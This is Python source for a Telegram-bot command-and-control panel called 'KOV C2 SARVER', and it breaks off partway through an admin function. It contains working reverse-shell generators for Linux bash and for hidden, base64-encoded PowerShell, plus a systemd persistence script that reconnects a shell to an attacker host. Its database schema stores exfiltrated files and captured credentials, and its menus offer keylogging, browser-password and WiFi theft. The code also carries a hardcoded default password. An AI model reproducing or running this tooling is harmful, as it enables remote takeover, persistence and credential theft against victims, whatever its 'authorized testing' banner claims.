from flask import Flask
import threading
import os

app = Flask(__name__)

@app.route("/")
def home():
    return "KOV C2 Running"

#!/usr/bin/env python3
import os
import sys
import json
import time
import base64
import sqlite3
import shutil
import stat
import struct
import socket
import threading
import subprocess
import logging
import tempfile
import zipfile
import io
import re
import platform
from datetime import datetime, timedelta
from pathlib import Path

def install_dependencies():
    required_packages = [
        'python-telegram-bot',
        'cryptography',
        'psutil',
        'requests',
    ]
    
    for pkg in required_packages:
        import_name = pkg.replace('-', '_')
        if import_name == 'python_telegram_bot':
            import_name = 'telegram'
        
        try:
            __import__(import_name)
            print(f"[âœ“] {pkg}")
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call(
                    [sys.executable, '-m', 'pip', 'install', '--quiet', pkg],
                    timeout=120
                )
                print(f"[âœ“] {pkg} installed")
            except:
                try:
                    termux_pkg = pkg.replace('python-telegram-bot', 'python-telegram-bot') \
                                     .replace('cryptography', 'python-cryptography') \
                                     .replace('psutil', 'python-psutil') \
                                     .replace('requests', 'python-requests')
                    subprocess.check_call(['pkg', 'install', '-y', termux_pkg], timeout=120)
                    print(f"[âœ“] {pkg} via pkg")
                except:
                    print(f"[!] Failed: {pkg}")

print("[*] Checking dependencies...")
install_dependencies()
print("[*] All dependencies ready!")

try:
    import psutil
    import requests
    from cryptography.fernet import Fernet
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, filters, ContextTypes, ConversationHandler
    )
    from telegram.constants import ParseMode
except ImportError as e:
    print(f"[!] Import failed: {e}")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet',
                          'python-telegram-bot', 'cryptography', 'psutil', 'requests'])
    import psutil
    import requests
    from cryptography.fernet import Fernet
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, filters, ContextTypes, ConversationHandler
    )
    from telegram.constants import ParseMode

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = 8571274512
BANNER_URL = "https://res.cloudinary.com/dqxlb29uz/image/upload/v1778756785/bwm_uploads/media-1778756785484.jpg"
DB_PATH = Path.home() / ".d4rk_c2.db"
KEY_PATH = Path.home() / ".d4rk_key.key"
PASS_HASH_PATH = Path.home() / ".d4rk_pass.hash"
ADMINS_PATH = Path.home() / ".d4rk_admins.json"
BANNED_PATH = Path.home() / ".d4rk_banned.json"
USERS_PATH = Path.home() / ".d4rk_users.json"
LOGS_PATH = Path.home() / ".d4rk_logs.json"
NOTIFIED_PATH = Path.home() / ".d4rk_notified.json"

(AUTH_PASS, TARGET_SELECT, CUSTOM_CMD, PORT_SCAN,
 BRUTE_SETUP, LISTENER_SETUP, FILE_UPLOAD, FILE_DOWNLOAD,
 ADMIN_INPUT, NICKNAME, ADMIN_CHANGE_PASS) = range(11)

BOX = "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

def load_json(path):
    if path.exists():
        with open(path) as f:
            return json.load(f)
    return []

def save_json(path, data):
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

def get_users():
    return load_json(USERS_PATH)

def save_user(user_id, nickname):
    users = get_users()
    users = [u for u in users if u['user_id'] != user_id]
    users.append({
        'user_id': user_id,
        'nickname': nickname,
        'first_seen': str(datetime.now()),
        'last_seen': str(datetime.now())
    })
    save_json(USERS_PATH, users)

def update_user_last_seen(user_id):
    users = get_users()
    for u in users:
        if u['user_id'] == user_id:
            u['last_seen'] = str(datetime.now())
            save_json(USERS_PATH, users)
            return

def get_user_nickname(user_id):
    users = get_users()
    for u in users:
        if u['user_id'] == user_id:
            return u.get('nickname', 'Unknown')
    return None

def get_notified_users():
    return load_json(NOTIFIED_PATH)

def mark_notified(user_id):
    notified = get_notified_users()
    if user_id not in notified:
        notified.append(user_id)
        save_json(NOTIFIED_PATH, notified)

def is_notified(user_id):
    return user_id in get_notified_users()

def get_admins():
    admins = load_json(ADMINS_PATH)
    if ADMIN_ID not in admins:
        admins.append(ADMIN_ID)
        save_json(ADMINS_PATH, admins)
    return admins

def add_admin(user_id):
    admins = get_admins()
    if user_id not in admins:
        admins.append(user_id)
        save_json(ADMINS_PATH, admins)
        return True
    return False

def remove_admin(user_id):
    if user_id == ADMIN_ID:
        return False
    admins = get_admins()
    if user_id in admins:
        admins.remove(user_id)
        save_json(ADMINS_PATH, admins)
        return True
    return False

def get_banned():
    return load_json(BANNED_PATH)

def ban_user(user_id):
    banned = get_banned()
    if user_id not in banned:
        banned.append(user_id)
        save_json(BANNED_PATH, banned)
        return True
    return False

def unban_user(user_id):
    banned = get_banned()
    if user_id in banned:
        banned.remove(user_id)
        save_json(BANNED_PATH, banned)
        return True
    return False

def is_admin(user_id):
    return user_id in get_admins()

def is_owner(user_id):
    return user_id == ADMIN_ID

def is_banned(user_id):
    return user_id in get_banned()

def is_authenticated(context, user_id):
    return context.user_data.get('authenticated', False) or is_admin(user_id)

def get_db():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript('''
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT NOT NULL,
            ip TEXT NOT NULL,
            os TEXT,
            username TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active',
            listener_port INTEGER DEFAULT 4444,
            encryption_key TEXT
        );
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            session_id TEXT UNIQUE,
            shell_type TEXT DEFAULT 'reverse',
            active INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            command TEXT NOT NULL,
            output TEXT,
            status TEXT DEFAULT 'pending',
            executed_at TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            filename TEXT NOT NULL,
            filepath TEXT,
            filetype TEXT,
            size INTEGER,
            exfiltrated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            source TEXT,
            url TEXT,
            username TEXT,
            password TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
    ''')
    conn.commit()
    conn.close()

def get_or_create_key():
    if KEY_PATH.exists():
        with open(KEY_PATH, 'rb') as f:
            return Fernet(f.read())
    key = Fernet.generate_key()
    with open(KEY_PATH, 'wb') as f:
        f.write(key)
    return Fernet(key)

cipher = get_or_create_key()

def encrypt_data(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data: str) -> str:
    try:
        return cipher.decrypt(data.encode()).decode()
    except:
        return "[DECRYPTION FAILED]"

def set_password(password: str):
    from hashlib import sha256
    h = sha256(password.encode()).hexdigest()
    with open(PASS_HASH_PATH, 'w') as f:
        f.write(h)

def check_password(password: str) -> bool:
    from hashlib import sha256
    if not PASS_HASH_PATH.exists():
        set_password("d4rk123")
        return password == "d4rk123"
    with open(PASS_HASH_PATH, 'r') as f:
        stored = f.read().strip()
    return sha256(password.encode()).hexdigest() == stored

def add_log(action, admin_id, target_id=None, details=None):
    logs = load_json(LOGS_PATH)
    log_entry = {
        'timestamp': str(datetime.now()),
        'action': action,
        'admin_id': admin_id,
        'target_id': target_id,
        'details': details
    }
    logs.append(log_entry)
    if len(logs) > 500:
        logs = logs[-500:]
    save_json(LOGS_PATH, logs)

def get_logs(limit=20):
    logs = load_json(LOGS_PATH)
    return logs[-limit:]

def build_start_keyboard():
    keyboard = [
        [InlineKeyboardButton("ðŸ” LOGIN", callback_data="start_login"),
         InlineKeyboardButton("â„¹ï¸ ABOUT", callback_data="start_about")]
    ]
    return InlineKeyboardMarkup(keyboard)

def build_main_menu(is_owner_user=False):
    keyboard = [
        [InlineKeyboardButton("ðŸŽ¯ TARGETS", callback_data="menu_targets"),
         InlineKeyboardButton("ðŸ’» SHELL", callback_data="menu_shell")],
        [InlineKeyboardButton("ðŸ” SCANNER", callback_data="menu_scan"),
         InlineKeyboardButton("ðŸ“ FILES", callback_data="menu_files")],
        [InlineKeyboardButton("ðŸ’‰ PAYLOADS", callback_data="menu_payloads"),
         InlineKeyboardButton("ðŸŽ§ LISTENER", callback_data="menu_listener")],
        [InlineKeyboardButton("ðŸ–¥ SYSTEM INFO", callback_data="menu_info"),
         InlineKeyboardButton("ðŸ“Š STATUS", callback_data="menu_status")],
        [InlineKeyboardButton("ðŸ§° POST-EXPLOIT", callback_data="menu_postex"),
         InlineKeyboardButton("ðŸ”¨ BRUTE FORCE", callback_data="menu_brute")],
        [InlineKeyboardButton("ðŸ“– HELP", callback_data="menu_help"),
         InlineKeyboardButton("ðŸšª LOGOUT", callback_data="menu_logout")]
    ]
    if is_owner_user:
        keyboard.append([InlineKeyboardButton("âš™ ADMIN PANEL", callback_data="menu_admin")])
    return InlineKeyboardMarkup(keyboard)

def build_admin_menu():
    keyboard = [
        [InlineKeyboardButton("ðŸ‘¥ ADD ADMIN", callback_data="admin_add"),
         InlineKeyboardButton("ðŸ—‘ REMOVE ADMIN", callback_data="admin_remove")],
        [InlineKeyboardButton("ðŸš« BAN USER", callback_data="admin_ban"),
         InlineKeyboardButton("âœ… UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("ðŸ“‹ USERS LIST", callback_data="admin_users_list"),
         InlineKeyboardButton("ðŸ“‹ ADMIN LIST", callback_data="admin_list_admins")],
        [InlineKeyboardButton("ðŸ“œ ADMIN LOGS", callback_data="admin_logs"),
         InlineKeyboardButton("ðŸ“Š DASHBOARD", callback_data="admin_dashboard")],
        [InlineKeyboardButton("âš™ VIEW CONFIG", callback_data="admin_view_config"),
         InlineKeyboardButton("ðŸ” CHANGE PASSWORD", callback_data="admin_change_pass")],
        [InlineKeyboardButton("ðŸ”” NOTIFICATIONS", callback_data="admin_notifications"),
         InlineKeyboardButton("ðŸ’¾ BACKUP", callback_data="admin_backup")],
        [InlineKeyboardButton("ðŸ§¹ RESET BOT", callback_data="admin_reset")],
        [InlineKeyboardButton("ðŸ”™ MAIN MENU", callback_data="menu_back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def build_cancel_keyboard():
    keyboard = [[InlineKeyboardButton("âŒ CANCEL", callback_data="admin_cancel")]]
    return InlineKeyboardMarkup(keyboard)

def build_back_keyboard():
    keyboard = [[InlineKeyboardButton("ðŸ”™ MAIN MENU", callback_data="menu_back")]]
    return InlineKeyboardMarkup(keyboard)

def build_target_actions_keyboard(target_id):
    keyboard = [
        [InlineKeyboardButton("ðŸ’» Shell", callback_data="shell:" + str(target_id)),
         InlineKeyboardButton("ðŸ” Scan", callback_data="scan:" + str(target_id))],
        [InlineKeyboardButton("ðŸ“ Files", callback_data="listfiles:" + str(target_id)),
         InlineKeyboardButton("ðŸ”‘ Browser Pass", callback_data="browserpass:" + str(target_id))],
        [InlineKeyboardButton("ðŸ”— Persistence", callback_data="persist:" + str(target_id)),
         InlineKeyboardButton("ðŸ“¸ Screenshot", callback_data="screenshot:" + str(target_id))],
        [InlineKeyboardButton("ðŸ“¶ WiFi", callback_data="wifi:" + str(target_id)),
         InlineKeyboardButton("âŒ¨ï¸ Keylogger", callback_data="keylogger:" + str(target_id))],
        [InlineKeyboardButton("âŒ Remove Target", callback_data="remove:" + str(target_id))],
        [InlineKeyboardButton("ðŸ”™ MAIN MENU", callback_data="menu_back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def network_scan(target_ip: str, ports: str = "1-1024") -> list:
    results = []
    try:
        port_range = ports.split('-')
        if len(port_range) == 2:
            start_p, end_p = int(port_range[0]), int(port_range[1])
        else:
            start_p = end_p = int(ports)
        
        for port in range(start_p, end_p + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    results.append({"port": port, "service": service, "state": "open"})
                sock.close()
            except:
                pass
    except:
        pass
    return results

def generate_reverse_shell(lhost: str, lport: int, platform_type: str = "linux") -> str:
    if platform_type == "linux":
        return f"""python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'"""
    elif platform_type == "windows":
        ps_code = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()"""
        b64 = base64.b64encode(ps_code.encode()).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}"
    return "Unsupported platform"

def generate_persistence_script():
    return """#!/bin/bash
cat > /etc/systemd/system/d4rk-c2.service << 'EOF'
[Unit]
Description=D4RK-K1NG C2 Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl enable d4rk-c2.service
systemctl start d4rk-c2.service"""

def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "platform": "Linux",
        "platform_release": "",
        "platform_version": "",
        "architecture": "",
        "processor": "",
        "cpu_count": 0,
        "memory": "Unknown",
        "memory_used": "0%",
        "disk": "Unknown",
        "disk_used": "0%",
        "ip": "",
        "python_version": sys.version,
        "uptime": "Unknown"
    }
    
    try:
        info["platform"] = platform.system()
        info["platform_release"] = platform.release()
        info["architecture"] = platform.machine()
        info["processor"] = platform.processor()
    except:
        pass
    
    try:
        info["cpu_count"] = os.cpu_count()
        info["memory"] = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
        info["memory_used"] = f"{psutil.virtual_memory().percent}%"
        info["disk"] = f"{psutil.disk_usage('/').total / (1024**3):.2f} GB"
        info["disk_used"] = f"{psutil.disk_usage('/').percent}%"
        info["uptime"] = str(timedelta(seconds=int(time.time() - psutil.boot_time())))
    except:
        pass
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip"] = s.getsockname()[0]
        s.close()
    except:
        info["ip"] = "Unknown"
    
    return info

def check_access(update, context):
    user_id = update.effective_user.id
    if is_banned(user_id):
        return False
    if not is_authenticated(context, user_id):
        return False
    update_user_last_seen(user_id)
    return True

async def notify_admins(context, message_text, parse_mode=None):
    admins = get_admins()
    for admin_id in admins:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=message_text,
                parse_mode=parse_mode or ParseMode.MARKDOWN
            )
        except:
            pass

async def notify_new_user(context, user_id, username, full_name):
    if is_notified(user_id):
        return
    mark_notified(user_id)
    msg = (
        f"{BOX}\n"
        f"ðŸ”” *New User Joined*\n"
        f"{BOX}\n\n"
        f"ðŸ‘¤ Username: @{username or 'N/A'}\n"
        f"ðŸ‘¤ Name: {full_name}\n"
        f"ðŸ†” ID: `{user_id}`\n"
        f"ðŸ“… Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"{BOX}"
    )
    await notify_admins(context, msg)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        await update.message.reply_text(
            f"{BOX}\nðŸš« *ACCESS DENIED*\n{BOX}\n\nYou have been banned from KOV C2 SARVER.\nContact the administrator if you believe this is a mistake.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if is_authenticated(context, user_id):
        context.user_data['authenticated'] = True
        nickname = get_user_nickname(user_id) or user.full_name
        role = "ðŸ‘‘ OWNER" if is_owner(user_id) else "ðŸ›¡ï¸ ADMIN"
        msg = (
            f"{BOX}\n"
            f"      ðŸ”¥ *KOV C2 SARVER* ðŸ”¥\n"
            f"{BOX}\n\n"
            f"*Welcome Back!* {nickname}\n"
            f"*Role:* {role}\n\n"
            f"{BOX}"
        )
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
        return
    
    try:
        await context.bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=BANNER_URL,
            caption=f"{BOX}\n      ðŸ”¥ *KOV C2 SARVER* ðŸ”¥\n{BOX}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass
    
    msg = (
        f"{BOX}\n"
        f"      ðŸ”¥ *KOV C2 SARVER* ðŸ”¥\n"
        f"{BOX}\n\n"
        f"*Developer:* D4RK-K1NG\n"
        f"*User:* {user.full_name}\n"
        f"*ID:* `{user_id}`\n\n"
        f"{BOX}\n"
        f"*Authorized Penetration Testing*\n"
        f"*Advanced Command & Control*\n"
        f"{BOX}\n\n"
        f"ðŸ” *Please login to access the system*"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
    
    await notify_new_user(context, user_id, user.username, user.full_name)

async def login_button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if is_banned(query.from_user.id):
        await query.edit_message_text(
            f"{BOX}\nðŸš« *BANNED*\n{BOX}\n\nYou are banned from this bot.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await query.edit_message_text(
        f"{BOX}\nðŸ” *LOGIN*\n{BOX}\n\nPlease enter your password:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=build_cancel_keyboard()
    )
    return AUTH_PASS

async def login_password_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    
    if check_password(password):
        context.user_data['authenticated'] = True
        context.user_data['temp_pass_ok'] = True
        await update.message.reply_text(
            f"{BOX}\nâœ… *PASSWORD CORRECT*\n{BOX}\n\nNow enter your nickname/display name:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_cancel_keyboard()
        )
        return NICKNAME
    else:
        await update.message.reply_text(
            "âŒ *Wrong password!* Try again or /cancel",
            parse_mode=ParseMode.MARKDOWN
        )
        return AUTH_PASS

async def login_nickname_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    nickname = update.message.text.strip()
    
    if len(nickname) < 2 or len(nickname) > 30:
        await update.message.reply_text(
            "âŒ Nickname must be 2-30 characters. Try again:",
            parse_mode=ParseMode.MARKDOWN
        )
        return NICKNAME
    
    save_user(user_id, nickname)
    
    role = "â™› OWNER" if is_owner(user_id) else "ðŸ›¡ï¸ ADMIN" if is_admin(user_id) else "ðŸ‘¤ USER"
    
    msg = (
        f"{BOX}\n"
        f"      âœ… *LOGIN SUCCESSFUL*\n"
        f"{BOX}\n\n"
        f"*Welcome, {nickname}!*\n"
        f"*Role:* {role}\n"
        f"*ID:* `{user_id}`\n\n"
        f"{BOX}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
    return ConversationHandler.END

async def login_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['authenticated'] = False
    if update.callback_query:
        await update.callback_query.edit_message_text(
            f"{BOX}\nðŸš« *LOGIN CANCELLED*\n{BOX}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_start_keyboard()
        )
    else:
        await update.message.reply_text(
            f"{BOX}\nðŸš« *LOGIN CANCELLED*\n{BOX}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_start_keyboard()
        )
    return ConversationHandler.END

async def login_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("ðŸš« You are banned from KOV C2 SARVER.")
        return
    
    if is_authenticated(context, user_id):
        await update.message.reply_text("âœ… You're already logged in! Use /menu")
        return
    
    if len(context.args) == 0:
        await update.message.reply_text("Usage: /login <password>")
        return
    
    if check_password(context.args[0]):
        context.user_data['authenticated'] = True
        nickname = get_user_nickname(user_id)
        if nickname:
            role = "ðŸ‘‘ OWNER" if is_owner(user_id) else "ðŸ›¡ï¸ ADMIN" if is_admin(user_id) else "ðŸ‘¤ USER"
            msg = (
                f"{BOX}\n"
                f"      âœ… *LOGIN SUCCESSFUL*\n"
                f"{BOX}\n\n"
                f"*Welcome Back, {nickname}!*\n"
                f"*Role:* {role}\n\n"
                f"{BOX}"
            )
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
        else:
            context.user_data['temp_pass_ok'] = True
            await update.message.reply_text(
                f"{BOX}\nâœ… *PASSWORD CORRECT*\n{BOX}\n\nNow enter your nickname/display name:",
                parse_mode=ParseMode.MARKDOWN
            )
            return NICKNAME
    else:
        await update.message.reply_text("âŒ *Incorrect password!*", parse_mode=ParseMode.MARKDOWN)
    
    return ConversationHandler.END

async def setpass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authenticated(context, user_id):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    
    if not is_admin(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Only admins can change the password.", parse_mode=ParseMode.MARKDOWN)
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /setpass <new_password>")
        return
    set_password(context.args[0])
    add_log("password_changed", user_id, details="Password changed via /setpass")
    await update.message.reply_text("âœ… *Password updated!*", parse_mode=ParseMode.MARKDOWN)

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("ðŸš« You are banned.")
        return
    
    if not check_access(update, context):
        await update.message.reply_text("ðŸ” Use /login <password> first")
        return
    
    nickname = get_user_nickname(user_id) or update.effective_user.full_name
    role = "ðŸ‘‘ OWNER" if is_owner(user_id) else "ðŸ›¡ï¸ ADMIN" if is_admin(user_id) else "ðŸ‘¤ USER"
    msg = (
        f"{BOX}\n"
        f"          ðŸ“‹ *MAIN MENU*\n"
        f"{BOX}\n\n"
        f"*Welcome, {nickname}*\n"
        f"*Role:* {role}\n\n"
        f"Select an option below:"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_access(update, context):
        await update.message.reply_text("ðŸ”’ Authenticate first with /login")
        return
    
    help_text = (
        f"{BOX}\n"
        f"     ðŸ“– *KOV C2 - COMMANDS*\n"
        f"{BOX}\n\n"
        f"*AUTHENTICATION*\n"
        f"/login <pass> - Login\n"
        f"/setpass <pass> - Change password\n"
        f"/menu - Show main menu\n\n"
        f"*TARGETS*\n"
        f"/targets - List targets\n"
        f"/addtarget <hostname> <ip> - Add target\n"
        f"/removetarget <id> - Remove target\n\n"
        f"*COMMANDS*\n"
        f"/shell <id> - Interactive shell\n"
        f"/cmd <id> <cmd> - Execute command\n"
        f"/scan <id> [ports] - Port scan\n\n"
        f"*FILES*\n"
        f"/upload <id> - Upload file\n"
        f"/listfiles <id> - List files\n\n"
        f"*POST-EXPLOITATION*\n"
        f"/screenshot <id> - Screenshot\n"
        f"/persistence <id> - Persistence\n"
        f"/browserpass <id> - Browser passwords\n"
        f"/wifi <id> - WiFi enumeration\n\n"
        f"*OTHER*\n"
        f"/payload <host> <port> [os] - Payload\n"
        f"/listener <port> - Start listener\n"
        f"/info - System info\n"
        f"/status - Bot status\n\n"
        f"*DEVELOPER:* D4RK-K1NG"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    msg = (
        f"{BOX}\n"
        f"        âš™ï¸ *ADMIN PANEL*\n"
        f"{BOX}\n\n"
        f"Manage administrators, bans, and bot settings:"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())

async def add_admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /addadmin <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
        if add_admin(target_id):
            await update.message.reply_text(f"âœ… *Admin Added*\nUser ID: `{target_id}`\n\nThey can now access without password.", parse_mode=ParseMode.MARKDOWN)
            add_log("admin_added", user_id, target_id)
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=(
                        f"{BOX}\n"
                        f"ðŸŽ‰ *You have been promoted*\n"
                        f"{BOX}\n\n"
                        f"*Role:* Administrator\n\n"
                        f"You now have full access to KOV C2 SARVER.\n"
                        f"Use /start to begin."
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
            await notify_admins(
                context,
                f"{BOX}\nðŸ”” *User Promoted*\n{BOX}\n\nðŸ‘¤ Username: @{update.effective_user.username or 'N/A'}\nðŸ†” ID: `{target_id}`\n\nNew administrator added.",
                ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(f"â„¹ï¸ User `{target_id}` is already an admin.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("âŒ Invalid ID. Use numeric Telegram user ID.")

async def remove_admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /removeadmin <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
        if target_id == ADMIN_ID:
            await update.message.reply_text("âŒ Cannot remove the owner.", parse_mode=ParseMode.MARKDOWN)
            return
        if remove_admin(target_id):
            await update.message.reply_text(f"âœ… *Admin Removed*\nUser ID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("admin_removed", user_id, target_id)
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=(
                        f"{BOX}\n"
                        f"âš  *Administrator role removed.*\n"
                        f"{BOX}\n\n"
                        f"You no longer have administrator access to KOV C2 SARVER."
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
        else:
            await update.message.reply_text(f"â„¹ï¸ User `{target_id}` is not an admin.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("âŒ Invalid ID.")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /ban <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
        if target_id == ADMIN_ID or is_admin(target_id):
            await update.message.reply_text("âŒ Cannot ban an admin.", parse_mode=ParseMode.MARKDOWN)
            return
        if ban_user(target_id):
            await update.message.reply_text(f"âœ… *User Banned*\nUser ID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("user_banned", user_id, target_id)
        else:
            await update.message.reply_text(f"â„¹ï¸ User `{target_id}` is already banned.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("âŒ Invalid ID.")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("âŒ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /unban <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
        if unban_user(target_id):
            await update.message.reply_text(f"âœ… *User Unbanned*\nUser ID: `{target_id}`", parse_mode=ParseMode.MARKDOWN)
            add_log("user_unbanned", user_id, target_id)
        else:
            await update.message.reply_text(f"â„¹ï¸ User `{target_id}` is not banned.", parse_mode=ParseMode.MARKDOWN)
    except ValueError:
        await update.message.reply_text("âŒ Invalid ID.")

async def list_admins_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
